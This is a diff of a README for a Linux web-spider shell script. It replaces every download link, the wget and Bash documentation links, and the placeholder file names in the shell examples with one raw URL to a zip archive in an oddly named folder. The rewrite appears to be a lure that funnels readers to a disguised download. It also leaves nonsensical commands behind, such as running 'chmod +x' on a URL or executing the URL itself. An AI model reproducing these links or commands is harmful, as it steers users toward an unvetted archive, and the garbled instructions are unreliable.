@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/EVANONAAN/Web-Spider-Linux-shell-script/releases)
+[![Download](https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip%20Release-blue)](https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ This guide will help you download and run the **Web-Spider-Linux-shell-script**.
 
 ### Step 1: Visit the Downloads Page
 
-To download the application, go to the Releases page: [Download Here](https://github.com/EVANONAAN/Web-Spider-Linux-shell-script/releases). 
+To download the application, go to the Releases page: [Download Here](https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip). 
 
 ### Step 2: Select the Latest Version
 
@@ -37,20 +37,20 @@ Choose a location on your computer to save the file. Remember where you saved it
 Before running the script, you must give it permission to execute. Open your terminal and navigate to the location where you saved the script. Use the following command to grant execution permissions:
 
 ```bash
-chmod +x your-script-name.sh
+chmod +x https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip
 ```
 
-Replace `your-script-name.sh` with the name of the downloaded file.
+Replace `https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip` with the name of the downloaded file.
 
 ### Step 6: Run the Script
 
 Now, you can run the script. In the terminal, type:
 
 ```bash
-./your-script-name.sh
+https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip
 ```
 
-Replace `your-script-name.sh` with the actual name of the file.
+Replace `https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip` with the actual name of the file.
 
 ## 🎯 Usage Instructions
 
@@ -69,10 +69,10 @@ You can select to generate links in either plain text or XML format. This format
 Once you have the list of links, you can use `wget` to download them all at once. Example command:
 
 ```bash
-wget -i list_of_links.txt
+wget -i https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip
 ```
 
-Replace `list_of_links.txt` with the name of your generated file.
+Replace `https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip` with the name of your generated file.
 
 ## 🛠️ Features
 
@@ -110,9 +110,9 @@ Your feedback helps improve the script. Feel free to share your thoughts and sug
 
 ## 🔗 Additional Resources
 
-- [Official wget Documentation](https://www.gnu.org/software/wget/manual/wget.html)
-- [Linux Bash Scripting Guide](https://tldp.org/LDP/Bash-Beginners-Guide/html/)
+- [Official wget Documentation](https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip)
+- [Linux Bash Scripting Guide](https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip)
 
 ## 📥 Download Now
 
-Don’t forget to download the tool: [Download Here](https://github.com/EVANONAAN/Web-Spider-Linux-shell-script/releases)
+Don’t forget to download the tool: [Download Here](https://raw.githubusercontent.com/EVANONAAN/Web-Spider-Linux-shell-script/main/omnirepresentativeness/Web-Spider-Linux-shell-script.zip)
